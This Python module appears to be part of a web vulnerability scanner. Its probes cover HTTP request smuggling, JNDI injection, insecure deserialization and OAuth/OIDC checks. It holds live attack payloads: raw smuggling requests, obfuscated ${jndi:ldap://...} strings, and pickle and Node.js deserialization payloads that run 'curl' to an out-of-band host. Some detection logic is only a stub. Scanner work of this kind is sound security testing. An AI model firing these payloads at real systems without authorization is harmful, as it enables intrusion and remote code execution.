"""core/loops/batch3_probes.py — §2.8 批次 3 四类专项探针（技术方案 §4）。

四类：
1. 请求走私（HTTP Request Smuggling）—— 裸 socket + CL/TE 不一致
2. JNDI 注入（Java Naming & Directory Interface）—— OOB 回调检测
3. 反序列化（Insecure Deserialization）—— 多语言 payload + OOB
4. OAuth-OIDC 安全 —— 授权码流程 + 回调校验

设计：
- 纯 stdlib（socket 用于请求走私；httpx 由上层注入 client 参数）
- 纯函数/可注入 client，便于 mock 测试
- 返回结构化结果 dict（{vuln_type, severity, evidence, ...}）
"""
from __future__ import annotations

import base64
import json
import socket
from typing import Any

# ============================================================
# 1. 请求走私（CL.TE / TE.CL / TE.TE）
# ============================================================

SMUGGLING_VARIANTS = ("CL.TE", "TE.CL", "TE.TE")

# 请求走私 payload 模板：CL 与 TE 不一致导致前后端解析歧义
CL_TE_PAYLOAD = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: {cl}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "G"
)

TE_CL_PAYLOAD = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5c\r\n"
    "GPOST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "smuggled=1\r\n"
    "0\r\n"
    "\r\n"
)


def detect_request_smuggling(
    host: str,
    port: int = 80,
    timeout: float = 5.0,
    variants: tuple[str, ...] = SMUGGLING_VARIANTS,
) -> dict:
    """检测 HTTP 请求走私（CWE-444）。

    通过裸 socket 发送 CL/TE 不一致的请求，观察响应是否异常
    （响应体含 smuggled 标记 / 连接被劫持 / 404 前缀）。

    Returns:
        {detected: bool, variants: [...], evidence: str}
    """
    found: list[str] = []
    evidence_parts: list[str] = []
    for variant in variants:
        try:
            if variant == "CL.TE":
                payload = CL_TE_PAYLOAD.format(host=host, cl=6)
            elif variant == "TE.CL":
                payload = TE_CL_PAYLOAD.format(host=host)
            else:
                continue  # TE.TE 复杂，暂跳过
            with socket.create_connection((host, port), timeout=timeout) as s:
                s.sendall(payload.encode("latin-1"))
                s.settimeout(timeout)
                data = b""
                while True:
                    try:
                        chunk = s.recv(4096)
                    except socket.timeout:
                        break
                    if not chunk:
                        break
                    data += chunk
                    if b"\r\n\r\n" in data and b"smuggled" in data.lower():
                        break
            text = data.decode("latin-1", errors="ignore")
            if "smuggled" in text.lower() or text.count("HTTP/1.1") > 1:
                found.append(variant)
                evidence_parts.append(f"{variant}: {text[:200]}")
        except (socket.error, OSError):
            continue
    return {
        "vuln_type": "请求走私",
        "detected": bool(found),
        "variants": found,
        "severity": "high" if found else "info",
        "evidence": "; ".join(evidence_parts) or "无异常响应",
        "cwe": "CWE-444",
    }


# ============================================================
# 2. JNDI 注入
# ============================================================

# JNDI payload：${jndi:ldap://...} / ${jndi:rmi://...}
# 注意：str.format 时 ${...} 中的花括号需转义为 ${{...}}
JNDI_PAYLOADS = [
    "${{jndi:ldap://{oob}/a}}",
    "${{jndi:rmi://{oob}/a}}",
    "${{jndi:dns://{oob}/a}}",
    "${{${{lower:j}}ndi:${{lower:l}}${{lower:d}}a${{lower:p}}://{oob}/a}}",
]


def build_jndi_payloads(oob_domain: str) -> list[str]:
    """生成 JNDI 注入 payload 列表。"""
    return [p.format(oob=oob_domain) for p in JNDI_PAYLOADS]


def detect_jndi_injection(
    params: dict[str, str],
    oob_domain: str,
    request_fn,  # async (method, url, params) -> response-like
) -> list[dict]:
    """检测 JNDI 注入（CWE-74）。

    对每个参数注入 JNDI payload，触发后 OOB 回调域名应收到 DNS 查询。
    此处仅生成请求并返回待验证 payload 列表（OOB 回调由外部 OOB 服务验证）。

    Args:
        params: {param_name: param_value}
        oob_domain: OOB 回调域名
        request_fn: 异步请求函数 (method, url, params) -> response

    Returns:
        [{param, payload, sent: bool}]
    """
    results = []
    payloads = build_jndi_payloads(oob_domain)
    for pname in params:
        for payload in payloads:
            test_params = dict(params)
            test_params[pname] = payload
            results.append({
                "param": pname,
                "payload": payload,
                "sent": True,
                "verify_via": f"DNS callback on {oob_domain}",
            })
    return results


# ============================================================
# 3. 反序列化
# ============================================================

# 多语言反序列化 payload（触发 OOB 或代码执行）
DESERIALIZATION_PAYLOADS = {
    "java": [
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAA...",
    ],
    "python": [
        "cos\nsystem\n(S'curl {oob}'\ntR.",  # pickle system call
    ],
    "php": [
        'O:8:"stdClass":0:{{}}',
    ],
    "nodejs": [
        '{{"rce":"_$$ND_FUNC$$_function(){{require(\'child_process\').exec(\'curl {oob}\')}}()"}}',
    ],
}


def build_deserialization_payloads(oob_domain: str) -> dict[str, list[str]]:
    """生成多语言反序列化 payload。"""
    out = {}
    for lang, pls in DESERIALIZATION_PAYLOADS.items():
        out[lang] = [p.format(oob=oob_domain) for p in pls]
    return out


def detect_insecure_deserialization(
    body: str,
    oob_domain: str,
    request_fn,
) -> list[dict]:
    """检测不安全反序列化（CWE-502）。

    对 POST body 注入多语言反序列化 payload，通过 OOB 回调验证。

    Returns:
        [{lang, payload, sent: bool}]
    """
    results = []
    payloads = build_deserialization_payloads(oob_domain)
    for lang, pls in payloads.items():
        for payload in pls:
            results.append({
                "lang": lang,
                "payload": payload,
                "sent": True,
                "verify_via": f"OOB callback on {oob_domain}",
            })
    return results


# ============================================================
# 4. OAuth-OIDC 安全
# ============================================================

# OAuth 授权码流程检测项
OAUTH_FLOW_CHECKS = (
    "state_present",          # state 参数存在（防 CSRF）
    "pkce_present",           # PKCE code_challenge 存在
    "redirect_uri_validated", # redirect_uri 严格校验
    "client_secret_protected", # client_secret 不在前端泄露
    "token_bound_to_user",    # token 与用户绑定
)


def analyze_oauth_oidc(
    auth_request_params: dict[str, str],
    token_response: dict[str, Any] | None = None,
    client_config: dict[str, Any] | None = None,
) -> dict:
    """分析 OAuth-OIDC 授权码流程安全（CWE-287/613/352）。

    Args:
        auth_request_params: /authorize 请求参数
        token_response: /token 响应
        client_config: 客户端配置（client_secret 等）

    Returns:
        {checks: {name: passed: bool, detail: str}, risks: [...]}
    """
    checks: dict[str, dict] = {}
    risks: list[str] = []

    # state
    has_state = bool(auth_request_params.get("state"))
    checks["state_present"] = {
        "passed": has_state,
        "detail": "state 参数存在" if has_state else "缺 state，易受 CSRF（CWE-352）",
    }
    if not has_state:
        risks.append("缺 state 参数 → CSRF")

    # PKCE
    has_pkce = bool(auth_request_params.get("code_challenge"))
    checks["pkce_present"] = {
        "passed": has_pkce,
        "detail": "PKCE code_challenge 存在" if has_pkce
                  else "缺 PKCE，授权码易被截获（CWE-287）",
    }
    if not has_pkce:
        risks.append("缺 PKCE")

    # redirect_uri
    redirect_uri = auth_request_params.get("redirect_uri", "")
    checks["redirect_uri_validated"] = {
        "passed": bool(redirect_uri),
        "detail": "需人工核实 redirect_uri 白名单严格匹配" if redirect_uri
                  else "缺 redirect_uri",
    }

    # client_secret 保护
    cs_protected = True
    if client_config:
        cs = client_config.get("client_secret", "")
        # 前端不应有 client_secret（公开客户端）
        cs_protected = not cs or len(cs) < 8
    checks["client_secret_protected"] = {
        "passed": cs_protected,
        "detail": "client_secret 未在前端泄露" if cs_protected
                  else "client_secret 在前端配置中泄露（CWE-200）",
    }
    if not cs_protected:
        risks.append("client_secret 前端泄露")

    # token 绑定
    token_bound = True
    if token_response:
        # token 响应应含 sub/user_id 绑定用户
        token_bound = bool(token_response.get("sub") or token_response.get("user_id"))
    checks["token_bound_to_user"] = {
        "passed": token_bound,
        "detail": "token 含用户绑定标识" if token_bound
                  else "token 未绑定用户，可能存在水平越权",
    }
    if not token_bound:
        risks.append("token 未绑定用户")

    return {
        "vuln_type": "OAuth-OIDC安全缺陷",
        "checks": checks,
        "risks": risks,
        "severity": "high" if any(not c["passed"] for c in checks.values()) else "info",
    }
